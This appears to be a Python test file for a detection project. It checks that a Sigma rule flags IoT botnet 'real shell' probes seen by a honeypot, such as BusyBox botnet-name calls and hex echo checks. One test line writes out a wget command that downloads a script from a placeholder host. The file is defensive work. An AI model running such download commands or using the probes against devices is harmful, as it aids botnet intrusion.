"""Tests for what the Sigma rules in rules/ match, against command lines from the honeypot.

Run from the repository root (PyYAML comes with sigma-cli):

    python3 -m unittest discover -s tests

`sigma check` in CI checks that the rules are valid, not what they match. These tests read each
rule from rules/ as published and check it against real command lines from the honeypot, one per
process as a process-creation log would show them. Random BusyBox words are swapped for others
of the same shape (upper case, lower case and digits in the same places), so none can be matched
to the honeypot. Nothing is run.

Sigma's own library has no way to match an event, so `sigma_matches` is a small evaluator for the
parts these rules use: the endswith, contains and re modifiers, lists, and and/or/not, "all of"
and "1 of" conditions. Like Sigma, endswith and contains ignore case and re doesn't.
"""

import fnmatch
import re
import unittest
from pathlib import Path

import yaml

RULES = Path(__file__).resolve().parent.parent / "rules"


def detection_of(name):
    return yaml.safe_load((RULES / name).read_text(encoding="utf-8"))["detection"]


def field_matches(event, spec, wanted):
    field, *modifiers = spec.split("|")
    assert set(modifiers) <= {"endswith", "contains", "re"}, f"unsupported modifier in {spec}"
    actual = event.get(field)
    if actual is None:
        return False

    def one(value):
        if "re" in modifiers:
            return re.search(value, actual) is not None
        a, v = actual.lower(), str(value).lower()
        if "contains" in modifiers:
            return v in a
        if "endswith" in modifiers:
            return a.endswith(v)
        return a == v

    return any(one(v) for v in (wanted if isinstance(wanted, list) else [wanted]))


def selection_matches(event, selection):
    if isinstance(selection, list):
        return any(selection_matches(event, s) for s in selection)
    return all(field_matches(event, spec, wanted) for spec, wanted in selection.items())


def sigma_matches(detection, event):
    results = {name: selection_matches(event, s) for name, s in detection.items() if name != "condition"}

    def quantified(m):
        hits = [hit for name, hit in results.items() if fnmatch.fnmatch(name, m[2])]
        assert hits, f"no selection matches {m[2]}"
        return str(all(hits) if m[1] == "all" else any(hits))

    condition = re.sub(r"\b(all|1) of (\S+)", quantified, detection["condition"])
    words = re.findall(r"\(|\)|\w+", condition)
    python = " ".join(w if w in ("(", ")", "and", "or", "not", "True", "False") else str(results[w])
                      for w in words)
    return eval(python, {"__builtins__": {}})  # only True, False, and, or, not and brackets


class BotSandboxChecksTests(unittest.TestCase):
    """Rule 07: a bot checking for a real shell."""

    def setUp(self):
        self.rule = detection_of("07_bot_sandbox_checks.yml")

    def matches(self, command):
        return sigma_matches(self.rule, {"CommandLine": command})

    def test_botnet_names_match(self):
        # The names the honeypot saw from Nov 3 to Nov 6. "Cult" isn't all capitals.
        for word in ("SORA", "HISILICON", "V3G4", "KYTON", "YAKUZA", "UNSTABLE", "Cult", "BOTNET"):
            self.assertTrue(self.matches(f"/bin/busybox {word}"), word)

    def test_the_three_random_words_seen_match(self):
        # Shaped like the random words bots sent from Nov 8 to Nov 10: two start with a capital
        # and one with a lower-case letter. The first version of the rule matched none of them.
        for word in ("ABcDe1Fg", "Abcd1EFg", "aBC1d2ef"):
            self.assertTrue(self.matches(f"/bin/busybox {word}"), word)

    def test_the_echo_checks_still_match(self):
        for command in ("echo -e '\\x48\\x47\\x4a\\x4e\\x4e\\x4f'", 'echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"',
                        "echo SHELL_TEST"):
            self.assertTrue(self.matches(command), command)

    def test_real_applets_do_not_match(self):
        for command in ("/bin/busybox wget -q -O x.sh http://192.0.2.10/x.sh", "/bin/busybox cat /proc/mounts",
                        "/bin/busybox hostname TENTOB", "/bin/busybox ls /home", "/bin/busybox dos2unix notes.txt",
                        "/bin/busybox sha256sum firmware.bin", "/bin/busybox", "echo hello"):
            self.assertFalse(self.matches(command), command)


class EvaluatorTests(unittest.TestCase):
    """The small evaluator above, so a broken evaluator can't make the rule tests pass."""

    def test_a_selection_needs_every_field_and_a_list_needs_one_item(self):
        detection = {"sel": {"Image|endswith": ["/a", "/b"], "CommandLine|contains": "x"}, "condition": "sel"}
        self.assertTrue(sigma_matches(detection, {"Image": "/bin/B", "CommandLine": "aXa"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/bin/c", "CommandLine": "x"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/bin/a", "CommandLine": "y"}))

    def test_regexes_keep_case_and_conditions_combine(self):
        detection = {"s_a": {"CommandLine|re": "A"}, "s_b": [{"Image": "/x"}, {"Image": "/y"}],
                     "condition": "s_a and not s_b"}
        self.assertTrue(sigma_matches(detection, {"Image": "/z", "CommandLine": "A"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/z", "CommandLine": "a"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/y", "CommandLine": "A"}))
        detection["condition"] = "1 of s_*"
        self.assertTrue(sigma_matches(detection, {"Image": "/y", "CommandLine": "a"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/z", "CommandLine": "a"}))


if __name__ == "__main__":
    unittest.main()
